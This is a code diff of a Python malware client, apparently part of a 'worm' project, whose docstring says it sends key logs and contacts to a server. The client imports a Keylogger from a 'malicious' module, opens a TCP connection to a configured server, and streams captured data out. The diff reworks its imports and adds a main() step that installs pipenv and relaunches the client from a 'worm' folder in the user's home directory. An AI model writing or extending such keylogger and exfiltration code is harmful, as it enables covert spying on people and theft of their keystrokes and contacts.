@@ -4,16 +4,17 @@ Client that sends key logs and contacts to server
 """
 
 import os
+import subprocess
 import sys
 
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'malicious')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server')))
 
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-from constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
-from keylogger import Keylogger
-from protocol import Protocol
+from server.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
+from malicious import keylogger
+from server.clnt.protocol import Protocol
 
 
 class Client:
@@ -26,7 +27,7 @@ class Client:
             self.client_socket = socket(AF_INET, SOCK_STREAM)
             self.client_socket.connect((ip, port))
             self.login()
-            self.keylogger = Keylogger()
+            self.keylogger = keylogger.Keylogger()
             self.output()
         except error as msg:
             print(f"Connection failure: {msg}\n terminating program")
@@ -86,6 +87,9 @@ def main():
     """
     Constructs a client and runs it
     """
+    path_to_client = os.path.join("C:/", "Users", os.getlogin(), "worm", "clnt", "client.py")
+    subprocess.run([sys.executable, "-m", "pip", "install", "pipenv"], check=True)
+    subprocess.run(['pipenv', 'run', 'python', path_to_client], check=True)
     Client(CLIENT_IP, PORT)
 
 
